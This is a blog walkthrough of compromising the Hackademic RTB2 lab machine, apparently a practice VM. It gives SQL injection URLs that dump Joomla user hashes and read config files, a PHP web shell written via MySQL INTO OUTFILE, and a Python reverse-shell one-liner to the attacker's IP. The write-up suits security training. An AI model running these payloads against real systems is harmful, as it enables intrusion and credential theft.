@@ -1,0 +1,363 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>Hackademic RTB2  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: Netdiscover
+Nmap
+Wfuzz
+Nikto
+Joomscan
+Metasploit Vulnerabilities: Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation Use &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Hackademic RTB2</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Joomscan</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.158 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like port 80 is opening and port 666 is filtered.</p>
+
+<p>Use both wfuzz to scan the host</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>phpmyadmin</code></p>
+
+<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>
+
+<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz scan again</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the webpage <code>http://192.168.41.158:666/</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it is joomla</p>
+
+<p>now use Joomba to scan the app</p>
+
+<p><code>joomscan -u http://192.168.41.158:666/</code></p>
+
+<p>nothing cool comes out.</p>
+
+<p>use metasploit</p>
+
+<p><code>search joomla</code></p>
+
+<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/http/joomla_plugins
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rport 666
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; run</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p>so first step, verify the sql injection:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then try to get column number:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the column number is 2</p>
+
+<p>next find out which column we can use</p>
+
+<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Column 2</p>
+
+<p>try to check mysql version</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all table name</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all column name of table jos_users</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next, get column username and password:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The format is hash:salt</p>
+
+<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt </span></code></pre></td></tr></table></div></figure>
+
+
+<p>for administrator, I didn&rsquo;t get the password</p>
+
+<p>for JSmith, password is matrix, for BTallor, password is victim.</p>
+
+<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find the username/password. Use it login phpmyadmin</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I will create a backdoor using mysql:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>create database pwn;
+</span><span class='line'>create table backdoor(script text);
+</span><span class='line'>insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
+</span><span class='line'>select * into outfile "/var/www/shells.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>check the backdoor.</p>
+
+<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>good.</p>
+
+<p>Setup netcat and</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-08-10T15:38:10-05:00" pubdate data-updated="true">2016-08-10 15:38:10 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/joomla/'>joomla</a>, <a class='category' href='/blog/categories/phpmyadmin/'>phpmyadmin</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2016
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
